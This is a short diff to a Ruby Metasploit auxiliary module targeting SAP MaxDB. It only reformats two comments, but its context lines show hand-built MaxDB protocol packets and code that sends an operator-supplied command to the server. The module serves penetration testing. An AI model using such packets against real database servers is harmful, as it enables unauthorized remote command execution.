@@ -37,7 +37,7 @@ class Metasploit3 < Msf::Auxiliary
   def run
     connect
 
-    #Grab the MaxDB info.
+    # Grab the MaxDB info.
     pdbmsrv =  "\x5A\x00\x00\x00\x03\x5B\x00\x00\x01\x00\x00\x00\xFF\xFF\xFF\xFF"
     pdbmsrv << "\x00\x00\x04\x00\x5A\x00\x00\x00\x00\x02\x42\x00\x04\x09\x00\x00"
     pdbmsrv << "\x00\x40\x00\x00\xD0\x3F\x00\x00\x00\x40\x00\x00\x70\x00\x00\x00"
@@ -60,7 +60,7 @@ class Metasploit3 < Msf::Auxiliary
       print_status(info)
     end
 
-    #Send our command.
+    # Send our command.
     len = 39 + datastore['CMD'].length
 
     data =  len.chr + "\x00\x00\x00\x03\x3F\x00\x00\x01\x00\x00\x00\x54\x0D\x00\x00"
